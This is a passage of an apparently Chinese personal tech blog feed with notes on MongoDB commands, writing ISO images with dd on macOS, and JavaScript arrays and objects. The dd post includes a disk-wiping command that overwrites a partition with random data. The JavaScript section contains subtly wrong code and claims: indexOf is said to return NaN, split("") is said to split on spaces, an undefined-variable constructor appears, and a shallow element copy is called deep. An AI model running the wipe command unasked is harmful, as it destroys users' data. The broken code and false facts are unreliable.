class="built_in">认true</span>为是<span class="built_in">，false</span>为否</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,<span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;<span class="built_in">,false</span><span class="built_in">,true</span>)</span><br><span class="line">//这样子为将tom的那条数据替换成<span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;，默认为替换不是修改</span><br></pre></td></tr></table></figure><p><strong>下面运算符可在新数据里面使用</strong></p><table><thead><tr><th>运算符</th><th>作用</th></tr></thead><tbody><tr><td>$inc</td><td>递增</td></tr><tr><td>$rename</td><td>重命名列</td></tr><tr><td>$set</td><td>修改列值</td></tr><tr><td>$unset</td><td>删除列</td></tr></tbody></table><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$inc</span>使用，将age增加<span class="number">3</span></span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$inc:</span>&#123;age: <span class="number">3</span>&#125;&#125;)</span><br><span class="line">//<span class="variable">$inc</span>使用，将age减少<span class="number">3</span></span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$inc:</span>&#123;age: -<span class="number">3</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$rename</span>使用，修<span class="built_in">改name</span>命名为uname</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$rename:</span><span class="built_in">&#123;name</span>:<span class="string">&quot;uname&quot;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$set</span>使用，将修<span class="built_in">改name</span>为saily</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$set:</span><span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$unset</span>使用，将age字段删除<span class="built_in">,true</span>为删除</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$unset:</span>&#123;age:true&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一次性写多个修改器</span></span><br><span class="line">db.collection.<span class="title function_ invoke__">update</span>(&#123;<span class="attr">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;</span><br><span class="line"><span class="variable">$inc</span>:&#123;<span class="attr">age</span>: <span class="number">3</span>&#125;,</span><br><span class="line"><span class="variable">$set</span>:&#123;<span class="attr">name</span>:<span class="string">&quot;saily&quot;</span>&#125;,</span><br><span class="line"><span class="variable">$rename</span>:&#123;<span class="attr">name</span>:<span class="string">&quot;uname&quot;</span>&#125;,</span><br><span class="line"><span class="variable">$unset</span>:&#123;<span class="attr">age</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h4><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">db.collection.<span class="built_in">find</span>(条件[,查询的列])</span><br><span class="line"><span class="comment">//格式化查询文档</span></span><br><span class="line">db.collection.<span class="built_in">find</span>().pretty();</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询age为6的数据</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;age:<span class="number">6</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询age为6和sex为male的数据</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;age:<span class="number">6</span>,sex:<span class="string">&quot;male&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询的列 表示 结果筛选</span></span><br><span class="line"><span class="comment">//查询name为tom只显示age字段</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;age:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询name为tom除了age字段都显示</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;age:<span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure><h4 id="删："><a href="#删：" class="headerlink" title="删："></a>删：</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.remove</span>(条件<span class="selector-attr">[,是否删除一条]</span>)</span><br><span class="line"><span class="comment">//删除集合中所有文档</span></span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.remove</span>(&#123;&#125;)</span><br><span class="line"><span class="comment">//是否删除一条，只删除一条为true，默认为否删除全部false</span></span><br></pre></td></tr></table></figure><h3 id="排序："><a href="#排序：" class="headerlink" title="排序："></a>排序：</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JSON数据里面根据键值排序，键为字段名，值为1则升序排序，值为-1则为降序排序</span></span><br><span class="line"><span class="keyword">db</span>.collectionname.find().<span class="keyword">sort</span>(JSON数据)</span><br><span class="line"></span><br><span class="line"><span class="comment">//年龄按降序排序</span></span><br><span class="line"><span class="keyword">db</span>.<span class="keyword">test</span>.find().<span class="keyword">sort</span>(&#123;age: -1&#125;);</span><br></pre></td></tr></table></figure><h3 id="Limit与Skip方法："><a href="#Limit与Skip方法：" class="headerlink" title="Limit与Skip方法："></a>Limit与Skip方法：</h3><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>()<span class="selector-class">.skip</span>(数字)<span class="selector-class">.limit</span>(数字);</span><br><span class="line"><span class="comment">//skip跳过指定数量文档（可选），limit限制查询的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//降序查询2条数据</span></span><br><span class="line">db<span class="selector-class">.test</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>(&#123;age:-<span class="number">1</span>&#125;)<span class="selector-class">.limit</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//降序查询2条而且跳过2条数据</span></span><br><span class="line">db<span class="selector-class">.test</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>(&#123;age:-<span class="number">1</span>&#125;)<span class="selector-class">.skip</span>(<span class="number">2</span>)<span class="selector-class">.limit</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h3 id="聚合查询："><a href="#聚合查询：" class="headerlink" title="聚合查询："></a>聚合查询：</h3><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">db.collectionname.aggregate([</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;管道:&#123;表达式&#125;</span><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml">...</span></span><br><span class="line"><span class="language-xml">])</span></span><br></pre></td></tr></table></figure><p><strong>常用管道</strong></p><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>$group</td><td>将集合中的文档分组，用于统计结果</td></tr><tr><td>$match</td><td>过滤数据，只要输出符合条件的文档</td></tr><tr><td>$sort​</td><td>聚合数据进一步排序</td></tr><tr><td>$skip</td><td>跳过指定的文档数</td></tr><tr><td>$limit</td><td>限制集合数据返回文档数</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p><strong>常用表达式</strong></p><table><thead><tr><th align="left">方法</th><th>作用</th><th>用法</th></tr></thead><tbody><tr><td align="left">$sum</td><td>总和</td><td>$sum:1 同count表示统计</td></tr><tr><td align="left">$avg</td><td>平均</td><td></td></tr><tr><td align="left">$min</td><td>最小值</td><td></td></tr><tr><td align="left">$max</td><td>最大值</td><td></td></tr><tr><td align="left">…</td><td>…</td><td>…</td></tr></tbody></table><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>统计sex的总人数</span><br><span class="line">db.test.aggregate([</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$group</span>:&#123;</span><br><span class="line">_id: <span class="string">&quot;$sex&quot;</span>,<span class="regexp">//</span>按照sex列的顺序分组</span><br><span class="line">rs:  &#123;<span class="variable">$sum</span>:<span class="number">1</span>&#125;<span class="regexp">//</span>rs为统计总和的结果</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//统计所有人数的平均年龄</span></span><br><span class="line">db.test.<span class="title function_ invoke__">aggregate</span>([</span><br><span class="line">&#123;<span class="variable">$group</span>:&#123;</span><br><span class="line"><span class="attr">_id</span>: <span class="literal">null</span>,</span><br><span class="line"><span class="attr">totalNum</span>:  &#123;<span class="variable">$sum</span>: <span class="number">1</span>&#125;,</span><br><span class="line"><span class="attr">avgAge</span>: &#123;<span class="variable">$avg</span>: <span class="string">&quot;<span class="subst">$age</span>&quot;</span>&#125;</span><br><span class="line">&#125;&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查询每个sex的人数，按人数升序排序</span></span><br><span class="line">db.test.<span class="title function_ invoke__">aggregate</span>([</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$group</span>:&#123;</span><br><span class="line"><span class="attr">_id</span>: <span class="string">&quot;<span class="subst">$sex</span>&quot;</span>,</span><br><span class="line"><span class="attr">totalNum</span>: &#123;<span class="variable">$sum</span>:<span class="number">1</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$sort</span>:&#123;<span class="attr">totalNum</span>:<span class="number">1</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><h3 id="索引："><a href="#索引：" class="headerlink" title="索引："></a>索引：</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建索引语法</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.createIndex</span>(待创建索引的列<span class="selector-attr">[,额外选项]</span>)</span><br><span class="line"><span class="comment">//待创建索引的列： &#123;键:1,...,键:-1&#125; 1为按升序创建索引，-1位按降序创建索引</span></span><br><span class="line"><span class="comment">//额外选项：设置索引的名称或者唯一索引等 &#123;name:indexname,unique:列名&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除索引语法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//全部删除</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.dropIndexes</span>()</span><br><span class="line"><span class="comment">//部分删除</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.dropIndex</span>(<span class="string">&#x27;索引名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看索引语法</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.getIndexes</span>()</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建多个索引</span></span><br><span class="line">db.collectionname.create<span class="constructor">Index(&#123;<span class="params">name</span>:1,<span class="params">age</span>:1&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建唯一索引</span></span><br><span class="line">db.collectionname.create<span class="constructor">Index(&#123;<span class="params">name</span>:1&#125;,&#123;<span class="params">unique</span>:<span class="params">age</span>&#125;)</span></span><br></pre></td></tr></table></figure><h3 id="分析索引："><a href="#分析索引：" class="headerlink" title="分析索引："></a>分析索引：</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">db.collectionname.find().explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>COLLSCAN 全表扫描</span><br><span class="line"><span class="regexp">//</span>IXSCAN 索引扫描</span><br><span class="line"><span class="regexp">//</span>FETCH 根据索引去检索指定的document</span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_0512-6029409.jpg" alt="IMG_0512"></p><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="comment">//未添加索引寻找</span></span><br><span class="line">db.test.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;).explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br><span class="line"><span class="comment">//添加索引寻找</span></span><br><span class="line">db.test.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;).explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="权限机制："><a href="#权限机制：" class="headerlink" title="权限机制："></a>权限机制：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">admin</span>;</span><br><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;huangjiahui&quot;</span>,</span><br><span class="line"><span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;huangjiahui&quot;</span>,</span><br><span class="line"><span class="attr">roles</span>:[&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;readWrite&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;huangjiahui&quot;</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;)；</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;账号&quot;</span>,</span><br><span class="line"><span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;密码&quot;</span>,</span><br><span class="line"><span class="attr">roles</span>:[&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;角色&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;所属数据库&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;readWrite&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;zdnfcj&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定某个数据库创建用户，要到当下的数据库下创建用户</span></span><br><span class="line"><span class="comment">//admin下的system.users集合能看到所有用户</span></span><br></pre></td></tr></table></figure><blockquote><p>#角色种类</p><p>超级用户角色：root</p><p>数据库用户角色：read、readWrite</p><p>数据库管理角色：dbAdmin、userAdmin</p><p>集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager</p><p>备份恢复角色：backup、restore</p><p>所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase</p></blockquote><p><strong>通过root登录</strong></p><ul><li>mongo ip:port/database -u user -p pwd</li><li>先登录 mongo，选择admin数据库，db.auth(user,pwd)</li></ul><h3 id="备份还原"><a href="#备份还原" class="headerlink" title="备份还原:"></a>备份还原:</h3><p><strong>备份</strong></p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">mongodump -h -port -u -p -d -o</span><br><span class="line"></span><br><span class="line">//语法说明</span><br><span class="line"><span class="deletion">-hhost ip</span></span><br><span class="line"><span class="deletion">-portport</span></span><br><span class="line"><span class="deletion">-uuser</span></span><br><span class="line"><span class="deletion">-ppwd</span></span><br><span class="line"><span class="deletion">-ddatabase</span></span><br><span class="line"><span class="deletion">-oopen./xxx/备份路径文件夹</span></span><br></pre></td></tr></table></figure><p><strong>还原</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">mongorestore -h -port -u -<span class="selector-tag">p</span> -d <span class="attr">--drop</span> 备份数据目录</span><br><span class="line"></span><br><span class="line">-d 不写则还原全部数据</span><br><span class="line"><span class="attr">--drop</span>  先删除数据库再导入</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Mongodb命令总结，避免遗忘。</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="MongoDB" scheme="https://www.scery.com/categories/Linux/MongoDB/"/>
    
    <category term="命令" scheme="https://www.scery.com/categories/Linux/MongoDB/%E5%91%BD%E4%BB%A4/"/>
    
    <category term="使用" scheme="https://www.scery.com/categories/Linux/MongoDB/%E5%91%BD%E4%BB%A4/%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="Services" scheme="https://www.scery.com/tags/Services/"/>
    
    <category term="MongoDB" scheme="https://www.scery.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>Diskutil工具集使用</title>
    <link href="https://www.scery.com/diskutil.htm"/>
    <id>https://www.scery.com/diskutil.htm</id>
    <published>2020-06-06T11:20:20.000Z</published>
    <updated>2024-03-18T02:51:00.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Diskutil"><a href="#Diskutil" class="headerlink" title="Diskutil"></a>Diskutil</h1><p>在Mac OS系统下不需要安装任何第三方软件，可以很方便地用自带的dd命令将iso镜像写入u盘。</p><p>操作如下：</p><p>1、找出U盘挂载的路径，使用如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diskutil list</span><br></pre></td></tr></table></figure><p>2、将U盘unmount（将N替换为挂载路径）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diskutil unmount Disk /dev/disk[N]</span><br></pre></td></tr></table></figure><p>3、写入U盘：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=iso路径 of=/dev/rdisk[N] bs=1m  </span><br></pre></td></tr></table></figure><p>rdisk 中加入r可以让写入速度加快</p><h3 id="将u盘备份到iso镜像"><a href="#将u盘备份到iso镜像" class="headerlink" title="将u盘备份到iso镜像"></a>将u盘备份到iso镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/rdisk[N] of= iso路径 bs=1m</span><br></pre></td></tr></table></figure><p>除此之外，dd命令还有以下作用：</p><h3 id="销毁磁盘数据"><a href="#销毁磁盘数据" class="headerlink" title="销毁磁盘数据"></a>销毁磁盘数据</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/urandom of=/dev/hda1</span><br></pre></td></tr></table></figure><p>注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。</p><h3 id="测试硬盘的读写速度"><a href="#测试硬盘的读写速度" class="headerlink" title="测试硬盘的读写速度"></a>测试硬盘的读写速度</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/root/1Gb.file bs=64k | <span class="built_in">dd</span> of=/dev/null</span><br></pre></td></tr></table></figure><p>通过以上两个命令输出的命令执行时间，可以计算出硬盘的读、写速度。</p>]]></content>
    
    
    <summary type="html">Macos写入iso镜像到移动设备</summary>
    
    
    
    <category term="MacOs" scheme="https://www.scery.com/categories/MacOs/"/>
    
    <category term="Service" scheme="https://www.scery.com/categories/MacOs/Service/"/>
    
    <category term="Diskutil" scheme="https://www.scery.com/categories/MacOs/Service/Diskutil/"/>
    
    
    <category term="Service" scheme="https://www.scery.com/tags/Service/"/>
    
    <category term="MacOs" scheme="https://www.scery.com/tags/MacOs/"/>
    
    <category term="Diskutil" scheme="https://www.scery.com/tags/Diskutil/"/>
    
  </entry>
  
  <entry>
    <title>javascript-data_tructures_and_algorithms</title>
    <link href="https://www.scery.com/JavaScript%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%8F%8F%E8%BF%B0.htm"/>
    <id>https://www.scery.com/JavaScript%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%8F%8F%E8%BF%B0.htm</id>
    <published>2020-06-05T02:57:28.000Z</published>
    <updated>2024-03-18T02:51:00.705Z</updated>
    
    <content type="html"><![CDATA[<h1 id="data-tructures-and-algorithms-for-JavaScript"><a href="#data-tructures-and-algorithms-for-JavaScript" class="headerlink" title="data tructures and algorithms for JavaScript"></a>data tructures and algorithms for JavaScript</h1><h4 id="arithmetic-operation"><a href="#arithmetic-operation" class="headerlink" title="arithmetic operation"></a>arithmetic operation</h4><p>精度问题：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>+<span class="number">1.1</span>)<span class="comment">//输出4.1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>*<span class="number">1.1</span>)<span class="comment">//输出3.3000000000000003</span></span><br></pre></td></tr></table></figure><p>如果计算精度不必像上面那样精确，可以格式化为固定精度：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">print</span>((<span class="number">3</span>*<span class="number">1.1</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>))<span class="comment">//显示3.30</span></span><br></pre></td></tr></table></figure><h4 id="OOP-object-oriented-programming"><a href="#OOP-object-oriented-programming" class="headerlink" title="OOP (object-oriented programming)"></a>OOP (object-oriented programming)</h4><p>构建一个检查银行账户对象的构造函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Checking</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">balance</span> = balance;<span class="comment">//属性</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">deposit</span> = deposite; <span class="comment">//方法</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">withdraw</span> = withdraw; <span class="comment">//方法</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">toString</span> = toString; <span class="comment">//方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this关键字用来将方法和属性绑定到一个对象的实例上</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">balance</span> += amount;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">balance</span>&lt;amount)&#123;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;Insufficient funds&quot;</span>)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">balance</span> -= amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;Balance:&quot;</span>+ <span class="variable language_">this</span>.<span class="property">balance</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法的互相引用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> bank = <span class="keyword">new</span> <span class="title class_">Checking</span>(<span class="number">500</span>);</span><br><span class="line">bank.<span class="title function_">deposit</span>(<span class="number">100</span>);</span><br><span class="line">bank.<span class="title function_">withdraw</span>(<span class="number">400</span>);</span><br></pre></td></tr></table></figure><h4 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h4><p>调用方法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">let</span> arr1 = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>);<span class="comment">//定义长度</span></span><br></pre></td></tr></table></figure><p><u>字符串</u>生成<u>数组</u>：</p><p><strong>split()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;A is a cat&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> arr = str.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>);<span class="comment">//根据空格分隔产生数组</span></span><br></pre></td></tr></table></figure><p><strong>浅复制</strong>和<strong>深复制</strong>：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1;</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2[<span class="number">0</span>]);<span class="comment">//输出100</span></span><br></pre></td></tr></table></figure><p><u>这种行为就叫做<strong>浅复制</strong>，新数组依然指向原来的数组，如果需要改变新数组的值，则需要使用<strong>深复制</strong>的方案</u></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">cp</span>(<span class="params">arr1,arr2</span>)&#123;</span><br><span class="line">  arr1.<span class="title function_">foreach</span>(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    arr2[index] = item;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><u>这种叫做深复制</u></strong>，将旧数组每一项的元素赋值到新数组上</p><h4 id="Access-function"><a href="#Access-function" class="headerlink" title="Access function"></a>Access function</h4><p>查找元素：</p><p><strong>indexOf()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> position = arr.<span class="title function_">indexOf</span>(<span class="string">&quot;b&quot;</span>);<span class="comment">//position为1</span></span><br><span class="line"><span class="keyword">let</span> position1 = arr.<span class="title function_">indexOf</span>(<span class="string">&quot;v&quot;</span>);<span class="comment">//position1位NAN</span></span><br></pre></td></tr></table></figure><p>如果数组中包含多个相同的元素，用indexOf()返回数组<u><strong>第一个值</strong></u>的索引</p><p><strong>lastIndexOf()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> position = arr.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;b&quot;</span>);<span class="comment">//position为2</span></span><br></pre></td></tr></table></figure><p>如果数组中包含多个相同的元素，用indexOf()返回数组<u><strong>最后一个值</strong></u>的索引</p><p>数组的字符串表示：</p><p><strong>join(),toString()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = [<span class="string">&quot;jack&quot;</span>,<span class="string">&quot;pack&quot;</span>,<span class="string">&quot;john&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> namestr = name.<span class="title function_">join</span>();</span><br><span class="line"><span class="keyword">let</span> namestr1 = name.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(namestr)<span class="comment">//输出jack,pack,john</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(namestr1)<span class="comment">//输出jack,pack,john</span></span><br></pre></td></tr></table></figure><p>这两个方法都返回一个包含数组所有元素的字符串，各元素之间用逗号分隔开。</p><p>实际上，当直接对<u><strong>一个数组</strong></u>使用<u><strong>print()函数</strong></u>时，系统会自动调用哪个数组的toString()方法。</p><p>由已知数组创建新数组：</p><p><strong>concat()</strong>:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>];</span><br><span class="line"><span class="keyword">let</span> newarr = arr.<span class="title function_">concat</span>(arr2);</span><br><span class="line"><span class="title function_">print</span>(newarr);<span class="comment">//输出1,2,3,4,5,6,7,8</span></span><br></pre></td></tr></table></figure><p>Array.concat(Array),作为参数的数组拼接在发起者的数组上</p><p><u><strong>splice()</strong></u>:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span 